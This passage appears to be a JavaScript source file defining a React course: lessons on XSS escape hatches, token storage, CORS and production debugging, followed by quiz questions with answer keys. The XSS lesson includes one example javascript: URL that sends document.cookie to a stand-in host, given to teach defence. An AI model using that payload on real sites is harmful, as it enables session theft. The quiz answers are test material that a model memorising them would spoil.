React escapes every value you interpolate into JSX. A \`userBio\` containing \`<script>alert(1)</script>\` renders as visible text, because React creates a text node instead of parsing HTML. That default covers almost everything — which is precisely why the remaining holes get missed.

### The three ways out of the escaping

**1. \`dangerouslySetInnerHTML\`.** The name is a warning, and it is accurate.

\`\`\`jsx
// Straight to the HTML parser: stored XSS in one line
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
\`\`\`

Store the raw text, sanitise on the way out, every time:

\`\`\`jsx
import DOMPurify from 'dompurify';
import { marked } from 'marked';

function Comment({ markdown }) {
  const html = useMemo(
    () => DOMPurify.sanitize(marked.parse(markdown), {
      ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'a'],
      ALLOWED_ATTR: ['href'],
    }),
    [markdown]
  );
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
\`\`\`

An allow-list of tags beats a block-list of bad ones: you cannot enumerate every attack, but you can enumerate the nine tags a comment is allowed to use.

**2. URLs in \`href\` and \`src\`.**

\`\`\`jsx
<a href={user.website}>Website</a>
\`\`\`

If \`user.website\` is \`javascript:fetch('https://evil.tld?c=' + document.cookie)\`, that link is an attack that fires on click. React 19 blocks that one scheme — it swaps the attribute for a stub that throws \`React has blocked a javascript: URL as a security precaution\` — but React 18 and earlier only logged a warning and rendered the URL as written, and no version of React filters \`data:\` or \`vbscript:\`, or the URLs you hand to \`location.assign\` and \`window.open\`. Validate the protocol yourself:

\`\`\`js
function safeHref(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? parsed.href : '#';
  } catch {
    return '#';                 // not a URL at all
  }
}
\`\`\`

**3. Spreading unvetted props.**

\`\`\`jsx
<div {...propsFromApi} />   // one of those keys could be dangerouslySetInnerHTML
\`\`\`

Pick the props you want by name. A spread is a promise that you trust every key in that object, forever.

### Defence in depth: a Content Security Policy

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
\`\`\`

A CSP blocks inline scripts and unknown script hosts, so an injection that slips past your sanitiser has nowhere to execute. Adding one to an existing app usually breaks something on the first attempt — that is the policy telling you what your page actually loads. Start in \`Content-Security-Policy-Report-Only\` mode and read the reports for a week before enforcing.

### Third-party scripts run with your privileges

A chat widget, a tag manager or an analytics snippet on your origin can read the DOM, your cookies that are not \`httpOnly\`, and anything in \`localStorage\`. Add \`integrity\` hashes to the script tags that support them, keep the vendor count low, and treat "marketing added a script" as a code change.

### The rule

Escape by default, sanitise the moment you opt out, validate URLs by protocol, and never let user text reach \`innerHTML\`, \`eval\`, or \`new Function\`. Rendering is not the only sink either — a search term written into \`document.title\`, or a redirect built from \`location.hash\`, is the same bug wearing different clothes.
        `),
        lesson('Auth Tokens, Cookies, and CORS', 14, `
Where the access token lives decides which attacks you are exposed to. There are two realistic options and they fail in different directions.

| | \`localStorage\` | httpOnly cookie |
|---|---|---|
| Readable by JavaScript | Yes — any XSS steals it | No |
| Sent automatically | No, you attach it | Yes, by the browser |
| CSRF exposure | None | Needs \`SameSite\` |
| Survives a refresh | Yes | Yes |

Because a single XSS (previous lesson) empties \`localStorage\` in one line, the default choice is a cookie the browser will not let JavaScript read:

\`\`\`js
// Server (Express) — the browser stores it; client JS cannot see it
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 1000 * 60 * 60 * 24 * 7,
});
\`\`\`

\`\`\`js
// Client — cookies are not sent cross-origin unless you ask
await fetch('https://api.example.com/me', { credentials: 'include' });
\`\`\`

\`SameSite=lax\` stops the cookie riding along on cross-site POSTs, which removes most CSRF without a token dance.

### CORS is the browser protecting the user, not the server

A CORS error does not mean the request was blocked. It was sent, the server answered, and the browser refused to hand you the response. Two rules explain most of the confusion:

- A request carrying a custom header (\`Authorization\`, \`X-Request-Id\`) or a JSON content type is **not simple**, so the browser first sends an \`OPTIONS\` **preflight**. If the server does not answer it with matching \`Access-Control-Allow-Headers\`, the real request never happens. The tell-tale symptom: everything worked until someone added a header.
- With \`credentials: 'include'\`, \`Access-Control-Allow-Origin: *\` is rejected. The server must echo the exact origin and add \`Access-Control-Allow-Credentials: true\`.

The dev proxy from Chapter 6 hides all of this locally, which is why CORS is so often a deploy-day discovery. Hit the real API origin once before launch.

### One refresh, not fifty

\`\`\`js
let refreshing = null;   // module scope: shared by every caller

async function apiFetch(path, options = {}) {
  const run = () => fetch(path, { ...options, credentials: 'include' });
  let res = await run();

  if (res.status === 401) {
    // Every 401 in flight waits on the SAME refresh promise
    refreshing ??= fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })
      .finally(() => { refreshing = null; });

    if (!(await refreshing).ok) { window.location.assign('/login'); return res; }
    res = await run();                       // retry once with the new cookie
  }
  return res;
}
\`\`\`

Without that shared promise, a dashboard with six queries fires six refresh requests at once. If your backend rotates refresh tokens, five of them fail, and the user is logged out at random — a bug that only appears on the busiest screen.

### Logout must clear the cache too

\`\`\`js
async function logout(queryClient) {
  await fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
  queryClient.clear();                 // drop every cached query (Chapter 3)
  window.location.assign('/login');    // a full load wipes in-memory state
}
\`\`\`

Skip \`clear()\` on a shared machine and the next person sees the previous user's cached dashboard for a second. It looks like a catastrophic authorisation failure; it is a stale cache.

### The client is not a security boundary

A hidden admin button, the \`RequireAuth\` wrapper from Chapter 3, a disabled input — all of it is user experience. Every one is a DevTools edit away from being bypassed, so the server authorises every request independently, using the session it verified itself.
        `),
        lesson('Debugging What You Cannot Reproduce', 14, `
A bug you can reproduce is half fixed. The skill worth building is for the other kind: it happens to one user, on one browser, only in production.

### Make a reproduction cheap to obtain

Ask for three things: the URL, the console error, and the failing request from the Network tab. Then make that URL worth asking for — the filters, tab and page you pushed into the query string in Chapter 1 turn a vague report into something you can open. A screen whose entire input is props plus URL params is reproducible in one click; one that depends on hidden context and \`localStorage\` is not.

### The tools, in the order you should reach for them

**React DevTools → Components.** Select the misbehaving node and read its real props, state and hook values. Edit one live to confirm which input drives the wrong output — faster than any log statement.

**"Highlight updates when components render".** Flashing outlines on components unrelated to your click is Chapter 3's context problem, visible in five seconds.

**Profiler with "Record why each component rendered".** It attributes each render to props, state, hooks or parent, which settles the argument Chapter 4 warned you not to have from intuition.

**The browser debugger.** Conditional breakpoints beat sprinkled logs — right-click the gutter and enter \`item.id === 4173\`. Turn on "Pause on caught exceptions" when something is swallowing an error.

\`\`\`js
console.table(rows.slice(0, 20));   // structured and sortable
console.count('render:' + id);      // cheaper than a counter in state
\`\`\`

### The production-only shortlist

| Symptom | Usual cause |
|---|---|
| Blank page after deploy, fine locally | Import path casing, or a cached \`index.html\` pointing at deleted chunks (Chapter 6) |
| Requests to \`undefined/api/...\` | A \`VITE_\` variable missing in CI |
| 404 on refresh, fine when navigating | Missing SPA rewrite (Chapter 3) |
| Wrong record after fast clicking | Unaborted fetch race (Chapter 2) |
| Breaks for one user only | Extension or ad blocker, a stale service worker, locale, or timezone |
| Safari only | An unsupported API, or \`new Date('2026-08-20 10:00')\`, which Safari refuses to parse |

Two of those you can force on your own machine: throttle the network to Slow 4G to expose races, and run with a different timezone (\`TZ=Asia/Karachi npm run dev\`) to expose date bugs.

### Instrument once, benefit for a year

Error monitoring with the source maps from Chapter 6 uploaded, breadcrumbs for route changes, clicks and requests, and a release tag on every deploy. That turns "it crashed" into a stack trace in your own code plus the last twelve things the user did. Add the user id and the app version to every report; "only version 2.4.1, only on iOS" is often the whole diagnosis.

### Narrow before you fix

Bisect rather than stare. \`git bisect start\`, mark a good and a bad commit, and let it find the change in a handful of steps. Inside a single screen, the same idea works by commenting out half the subtree.

### The classic mistake

\`\`\`jsx
const name = user?.profile?.name ?? '';   // the crash is gone, the bug is not
\`\`\`

Optional chaining added at the crash site is a decision to render wrong data silently. Ask why the profile is missing — an unauthenticated request, a race, a bad migration — and fix it there. If you genuinely must guard, log the case so you still learn how often it happens.

Then do the last step, which is Chapter 5's: write the failing test first, watch it fail for the right reason, and only then apply the fix. A bug without a regression test is a bug you have agreed to fix twice.
        `),
      ],
      [
        q('React escapes interpolated values automatically. Which of these can still put attacker-supplied HTML into the page?', [
          '<p>{userBio}</p>',
          '<img alt={userName} src={safeUrl} />',
          '<div {...propsFromApi} /> where the API object may carry a dangerouslySetInnerHTML key',
          '<input defaultValue={userName} />',
        ], 2, 'A spread trusts every key in the object forever, so one dangerouslySetInnerHTML key reaches the HTML parser; the other three are escaped text or attribute values React never parses as HTML.'),
        q('An access token is kept in localStorage. What is the specific risk that a cookie avoids?', [
          'Any successful XSS can read it and send it elsewhere',
          'It is lost when the tab closes',
          'It cannot be attached to fetch requests',
          'Browsers block it on HTTPS origins',
        ], 0, 'localStorage is readable by any script on the page, whereas an httpOnly cookie is invisible to JavaScript entirely.'),
        q('A cross-origin fetch worked until an Authorization header was added, and now fails with a CORS error. What changed?', [
          'Custom headers are never allowed cross-origin',
          'The request needs credentials: include',
          'The API must be served over HTTPS',
          'The request became non-simple, so the browser sends an OPTIONS preflight the server does not answer',
        ], 3, 'Any custom header triggers a preflight, and the real request is only sent if the server approves those headers.'),
        q('A deploy produces a blank page in production while everything works locally. Which cause fits best?', [
          'A missing Suspense boundary',
          'An import path whose casing differs from the filename, which only fails on a case-sensitive build machine',
          'Too many re-renders',
          'A stale closure in a useCallback',
        ], 1, 'macOS filesystems are case-insensitive, so a mis-cased import resolves locally and fails to resolve on the Linux build agent.'),
      ]
    ),
  ],
  final: [
    q('Why does {count && <Badge />} render a 0 when count is 0?', [
      'React converts falsy values to strings',
      'The && expression returns 0, and React renders numbers as text',
      'Badge receives count as a child',
      'JSX cannot short-circuit',
    ], 1, 'React skips false, null and undefined but renders 0, so the falsy number leaks into the output.'),
    q('An edit form keeps showing the previous record after the selection changes, because state was initialised from props. The cleanest fix is to', [
      'change the component key so React remounts it with new initial state',
      'add an effect that resets the state',
      'convert the inputs to uncontrolled',
      'wrap the component in React.memo',
    ], 0, 'A new key creates a new instance, resetting state without the stale first render a reset effect produces.'),
    q('setTotal is called inside an effect that watches items. What is the better design?', [
      'Store the total in a ref',
      'Move both values into context',
      'Debounce the effect',
      'Compute the total during render from items',
    ], 3, 'A value derivable from existing state is not state; syncing it creates a second source of truth that can drift.'),
    q('Which situation makes useReducer a better fit than useState?', [
      'A single boolean toggle',
      'A value read from localStorage once',
      'Several related fields that must change together under guarded transitions',
      'A DOM node reference',
    ], 2, 'Reducers express transitions and invariants in one testable function, and dispatch has a stable identity.'),
    q('Rapidly switching detail pages shows data from the wrong page. The missing piece is', [
      'effect cleanup that aborts or ignores the previous request',
      'a useMemo around the fetch',
      'a stable list key',
      'a Suspense boundary',
    ], 0, 'Responses can arrive out of order, so the earlier request must be cancelled or its result discarded on cleanup.'),
    q('Every consumer of a context re-renders on each provider render. The likely cause is', [
      'consumers are not wrapped in React.memo',
      'the provider passes a newly created object as its value',
      'the context has no default value',
      'the provider is too high in the tree',
    ], 1, 'Context notifies consumers when the value fails an identity check, and an inline object is new every render.'),
    q('What does React.memo actually prevent?', [
      "Re-renders caused by the component's own state",
      'Re-renders caused by context updates',
      'Re-renders caused by a parent rendering when props are unchanged',
      'DOM updates in general',
    ], 2, 'memo skips the parent-driven re-render only, and only while every prop keeps the same identity.'),
    q('Virtualising a 5,000-row list mainly improves performance by', [
      'shrinking the JavaScript bundle',
      'caching row components with useMemo',
      'moving rendering to a web worker',
      'reducing the number of DOM nodes the browser must lay out and paint',
    ], 3, 'Only the visible window plus overscan is rendered, so layout, paint and diffing cost collapses.'),
    q('Client-side form validation should be treated as', [
      'sufficient protection for the database',
      'a usability feature, with the server validating the same rules again',
      'optional if the API validates',
      'a replacement for required attributes',
    ], 1, 'Anyone can post directly to the endpoint, so server validation is the only validation that actually protects data.'),
    q('Why does React Testing Library recommend getByRole over getByTestId?', [
      'It queries the way users and assistive technology perceive the UI, so it also catches naming and role bugs',
      'It runs faster',
      'Test ids are deprecated',
      'It works without rendering',
    ], 0, 'Querying by role and accessible name tests the real interface rather than an implementation detail invisible to users.'),
    q('An error boundary shows its fallback and never recovers, even after the user opens a different record. What is missing?', [
      'componentDidCatch',
      'A global unhandledrejection listener',
      'resetKeys, or an equivalent reset, so the boundary clears when its inputs change',
      'A Suspense boundary around the same subtree',
    ], 2, 'Boundary state persists until something resets it, so a tripped boundary keeps rendering the old error for the rest of the session.'),
    q('A build-time environment variable in a React app is the right place for', [
      'a public API base URL, and never a secret, because it is inlined into the shipped bundle',
      'a database password, since only the build server reads it',
      'a payment provider secret key, provided the variable is prefixed',
      'a JWT signing key, because the bundle is minified',
    ], 0, 'Client env vars are text-substituted at build time, so every value they hold is readable by anyone who downloads the bundle.'),
    q('A cookie banner that loads late and pushes the page down damages', [
      'LCP, because the banner is the largest element',
      'INP, because the banner blocks the main thread',
      'TTFB, because it adds a request',
      'CLS, because already-painted content moves after the user can see it',
    ], 3, 'Content inserted above existing layout after paint is exactly what Cumulative Layout Shift measures.'),
    q('Rendering user-supplied HTML with dangerouslySetInnerHTML is acceptable only when', [
      'the value was returned by your own API',
      'it has been sanitised against an allow-list of tags and attributes first',
      'the application is running in production mode',
      'the element is hidden with CSS until the user opts in',
    ], 1, 'The prop hands the string straight to the HTML parser, so only sanitisation before that point prevents stored XSS.'),
  ],
});
